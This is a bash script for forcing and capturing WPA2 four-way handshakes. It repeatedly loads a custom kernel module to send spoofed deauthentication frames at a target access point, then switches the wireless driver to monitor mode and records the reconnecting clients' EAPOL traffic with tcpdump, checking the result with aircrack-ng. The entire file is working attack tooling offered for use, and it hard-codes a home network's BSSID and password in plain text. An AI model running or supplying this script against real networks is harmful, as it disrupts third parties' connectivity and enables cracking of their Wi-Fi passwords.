#!/bin/bash
# grab_handshake.sh - Two-phase WPA2 handshake capture
# Phase 1: STA mode - send spoofed deauth via petx6 (arbitrary AP)
# Phase 2: Monitor mode - capture handshake as clients reconnect
#
# Usage: grab_handshake.sh <TARGET_BSSID> <CHANNEL> [ROUNDS]
# The petx6.ko must already be built with the correct target BSSID

TARGET="$1"
CH="$2"
ROUNDS="${3:-5}"
FREQ=$((2407 + CH * 5))
DRIVER="/tmp/qca_cld3_wlan.ko"
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PASS="9006609b29404a"
OUTDIR="/tmp"

if [ -z "$TARGET" ] || [ -z "$CH" ]; then
    echo "Usage: $0 <TARGET_BSSID> <CHANNEL> [ROUNDS]"
    exit 1
fi

echo "[*] Handshake Capture: $TARGET ch$CH ($FREQ MHz)"
echo "[*] Rounds: $ROUNDS"

# Ensure petx6.ko exists
if [ ! -f /tmp/petx6.ko ]; then
    if [ -f /tmp/petx6.S ]; then
        cd /tmp && as -o petx6.o petx6.S && ld -r -o petx6.ko petx6.o
    else
        echo "[!] No petx6.ko or petx6.S found"
        exit 1
    fi
fi

# Clean old captures
rm -f $OUTDIR/hs_r*.pcap $OUTDIR/hs_final.pcap

got_handshake=0

for r in $(seq 1 $ROUNDS); do
    echo ""
    echo "========== ROUND $r/$ROUNDS =========="

    # ===== PHASE 1: STA MODE + DEAUTH =====
    echo "[Phase 1] Deauth via petx6"

    # Kill NM and wpa_supplicant
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant 2>/dev/null
    sleep 0.5

    # Reload driver in STA mode
    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 2
    insmod $DRIVER
    sleep 4

    # Connect to home AP
    systemctl start NetworkManager
    sleep 2
    nmcli device wifi connect $HOME_BSSID password $HOME_PASS ifname wlan0 2>/dev/null &
    CONN_PID=$!

    # Wait for connection (max 8s)
    OK=0
    for i in $(seq 1 40); do
        if iw dev wlan0 link 2>/dev/null | grep -q "Connected"; then
            OK=1
            break
        fi
        sleep 0.2
    done

    if [ $OK -eq 0 ]; then
        echo "[!] Home AP connect failed, skip round"
        kill $CONN_PID 2>/dev/null
        continue
    fi
    echo "[+] Connected to home AP"

    # Send 5 spoofed deauth bursts
    SENT=0
    for b in $(seq 1 5); do
        rmmod kfind 2>/dev/null
        sleep 0.05
        insmod /tmp/petx6.ko 2>/dev/null
        RC=$?
        if [ $RC -eq 0 ]; then
            SENT=$((SENT + 1))
        fi
        rmmod kfind 2>/dev/null
        sleep 0.1
    done
    echo "[+] Deauth sent: $SENT/5"

    # Check dmesg for confirmation
    dmesg | grep "petx6:" | tail -3

    # ===== PHASE 2: MONITOR MODE + CAPTURE =====
    echo "[Phase 2] Quick switch to monitor + capture"

    # Stop everything FAST
    systemctl stop NetworkManager 2>/dev/null
    killall wpa_supplicant 2>/dev/null
    kill $CONN_PID 2>/dev/null
    sleep 0.3

    # Reload in monitor mode
    ip link set wlan0 down 2>/dev/null
    rmmod wlan 2>/dev/null
    sleep 1.5
    insmod $DRIVER con_mode_monitor=4
    sleep 3
    ip link set wlan0 up
    iw dev wlan0 set freq $FREQ
    echo "[+] Monitor on $FREQ MHz"

    # Capture for 20 seconds
    CAPFILE="$OUTDIR/hs_r${r}.pcap"
    timeout 20 tcpdump -i wlan0 -w "$CAPFILE" 2>/dev/null
    echo "[+] Captured: $(ls -la $CAPFILE 2>/dev/null | awk '{print $5}') bytes"

    # Check for EAPOL
    EAPOL=$(tcpdump -r "$CAPFILE" 2>/dev/null | grep -ci "EAPOL\|802.1X\|Key (")
    echo "[*] EAPOL frames: $EAPOL"

    if [ $EAPOL -gt 0 ]; then
        echo "[!!!] EAPOL detected! Checking handshake..."
        # Merge all captures so far
        if command -v mergecap >/dev/null 2>&1; then
            mergecap -w "$OUTDIR/hs_final.pcap" $OUTDIR/hs_r*.pcap 2>/dev/null
        else
            cp "$CAPFILE" "$OUTDIR/hs_final.pcap"
        fi
        aircrack-ng "$OUTDIR/hs_final.pcap" 2>&1 | head -20
        if aircrack-ng "$OUTDIR/hs_final.pcap" 2>&1 | grep -qi "1 handshake"; then
            got_handshake=1
            echo "[!!!] HANDSHAKE CAPTURED!"
            break
        fi
    fi
done

# Final merge
echo ""
echo "========== RESULTS =========="
if command -v mergecap >/dev/null 2>&1; then
    mergecap -w "$OUTDIR/hs_final.pcap" $OUTDIR/hs_r*.pcap 2>/dev/null
else
    cat $OUTDIR/hs_r*.pcap > "$OUTDIR/hs_final.pcap" 2>/dev/null
fi

if [ -f "$OUTDIR/hs_final.pcap" ]; then
    ls -la "$OUTDIR/hs_final.pcap"
    aircrack-ng "$OUTDIR/hs_final.pcap" 2>&1 | head -20
fi

if [ $got_handshake -eq 1 ]; then
    echo "[*] SUCCESS - handshake in $OUTDIR/hs_final.pcap"
else
    echo "[*] No handshake captured after $ROUNDS rounds"
fi

# Restore connectivity
echo "[*] Restoring WiFi..."
ip link set wlan0 down 2>/dev/null
rmmod wlan 2>/dev/null
sleep 2
insmod $DRIVER
sleep 4
systemctl start NetworkManager 2>/dev/null
sleep 2
nmcli device wifi connect $HOME_BSSID password $HOME_PASS ifname wlan0 2>/dev/null
echo "[*] Done"
